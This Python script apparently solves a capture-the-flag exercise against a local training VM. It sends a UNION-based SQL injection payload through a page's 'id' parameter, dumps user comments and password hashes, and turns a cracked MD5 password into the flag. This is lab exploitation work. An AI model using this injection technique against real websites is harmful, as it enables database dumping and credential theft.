import hashlib
import os

import requests
from lxml import etree

VM_IP = os.environ.get("VM_IP", "192.168.122.213")


def inject(payload):
    url = f"http://{VM_IP}/?page=member&id={payload}&Submit=Submit#"
    root = etree.HTML(requests.get(url).text)
    return root.xpath("//pre/text()")


if __name__ == "__main__":
    # Extract hint and hash from users table
    rows = inject(
        "1 UNION SELECT CONCAT_WS(0x3A, Commentaire, countersign), NULL FROM users --"
    )

    for row in rows:
        if "Decrypt this password" not in row:
            continue
        md5_hash = row.split(":")[-1].strip()
        print(f"Hint:     {row.strip()}")
        print(f"MD5 hash: {md5_hash}")

        # MD5 decodes to "FortyTwo" (via crackstation.net) → lowercase → sha256
        plaintext = "fortytwo"
        flag = hashlib.sha256(plaintext.encode()).hexdigest()
        print(f"Flag:     {flag}")
        break
